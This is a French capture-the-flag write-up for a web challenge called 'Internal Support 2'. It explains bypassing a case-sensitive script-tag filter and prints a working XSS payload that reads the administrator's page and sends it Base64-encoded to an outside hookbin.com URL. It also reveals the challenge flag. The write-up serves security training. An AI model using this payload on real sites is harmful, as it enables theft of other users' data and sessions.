# Internal Support 2

## Description

Votre chance de débutant a des limites… La sécurité a été renforcée suite à la découverte de failles dans la précédente version !

Avec une posture d’attaquant, votre but est de parvenir à vous connecter en tant qu'administrateur. Malheureusement pour vous, le mot de passe est bien trop robuste, vous devez trouver un autre moyen.

> Accès à l'épreuve: http://internalsupport22.chall.malicecyber.com/


## Solution

On retrouve le même formulaire que pour `Internal Support 1`.

On reessaye notre payload mais on obtient le message `Malicious code detected !`.

En déformant les balises `<script>` avec des majuscules (`<SripT>`) le payload n'est plus détecté.

On récupère ainsi de la même manière le cookie, cependant un filtrage sur l'IP est fait.

On essaye donc de récupérer le contenu de la page par le biai de l'administrateur.

```html
<scRipt> 
var req=new XMLHttpRequest();req.onload=handleResponse;req.open('get','/',true);req.send();function handleResponse(){document.location='https://hookbin.com/Z2mRGkxzdXfR33eLJ60P/?c='+encodeURIComponent(btoa(this.responseText))};
</scriPt>
```

Après décodage de la réponse, on obtient le flag.

```html
<p class="text">
- Fix the kernel panic problem on the servers
</p>

<p class="text">
- Find a solution for the XSS on the helpdesk system
</p>

<p class="text">
- Hide the flag "BEtter_BUT_ST!LL_N0tttttttttt++Prfct!" a little bit better
</p>
```

Le flag est `BEtter_BUT_ST!LL_N0tttttttttt++Prfct!`.

## Write-up

- [Nicolas Bourras](https://nicolasb.fr/blog/writeup-dghack-internal-support-2/)
